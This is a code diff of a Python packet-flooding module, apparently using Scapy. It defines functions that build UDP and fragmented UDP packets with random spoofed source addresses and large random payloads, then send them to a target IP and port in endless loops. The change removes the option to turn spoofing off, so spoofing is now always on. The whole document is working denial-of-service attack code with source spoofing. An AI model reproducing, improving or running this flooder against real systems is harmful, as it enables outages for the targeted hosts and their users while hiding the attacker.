@@ -3,48 +3,39 @@ from sys import path
 path.append("..")
 import packet_builder
 
-def build_UDP_packet(destination_IP, destination_port, IP_spoofing=True):
+def build_udp_packet(destination_ip, destination_port):
     """Generate UDP packet with random source port.
 
     Arguments: 
-    destination_IP -- the IP address of the target
+    destination_ip -- the IP address of the target
     destination_port -- the targets port to which the packet will be sent
-    IP_spoofing -- enable or disable source IP spoofing (default True)
 
     """
-    if IP_spoofing:
-        return IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload()
+    return IP(src=RandIP(), dst=destination_ip, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload()
 
-    return IP(dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload()
-
-def build_fragemneted_udp_packet(destination_IP, destination_port, IP_spoofing=True):
+def build_fragemneted_udp_packet(destination_ip, destination_port):
     """Generate fragmented UDP packet with random source port.
 
     Arguments: 
-    destination_IP -- the IP address of the target
+    destination_ip -- the IP address of the target
     destination_port -- the targets port to which the packet will be sent
-    IP_spoofing -- enable or disable source IP spoofing (default True)
 
     """
-    if IP_spoofing:
-        return fragment(IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload(min_count=1500, max_count=65500), fragsize=packet_builder.generate_fragsize())
+    return fragment(IP(src=RandIP(), dst=destination_ip, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload(min_count=1500, max_count=65500), fragsize=packet_builder.generate_fragsize())
 
-    return fragment(IP(dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload(min_count=1500, max_count=65500), fragsize=packet_builder.generate_fragsize())
-
-
-def start_UDP_flood(destination_IP, destination_port, IP_spoofing):
+def start_udp_flood(destination_ip, destination_port):
     """Continuously send UDP packets"""
     try:
         while True:
-            send(build_UDP_packet(destination_IP, destination_port, IP_spoofing), inter=packet_builder.generate_delay_for_packet())   
+            send(build_udp_packet(destination_ip, destination_port), inter=packet_builder.generate_delay())   
     except KeyboardInterrupt:
         print("...Exiting...")
 
-def start_fragmented_udp_flood(destination_IP, destination_port, IP_spoofing):
+def start_fragmented_udp_flood(destination_ip, destination_port):
     """Continuously send fragmented UDP packets"""
     try:
         while True:
-            for frag in build_fragemneted_udp_packet(destination_IP, destination_port, IP_spoofing):
-                send(frag, inter=packet_builder.generate_delay_for_packet())
+            for frag in build_fragemneted_udp_packet(destination_ip, destination_port):
+                send(frag, inter=packet_builder.generate_delay())
     except KeyboardInterrupt:
         print("...Exiting...")
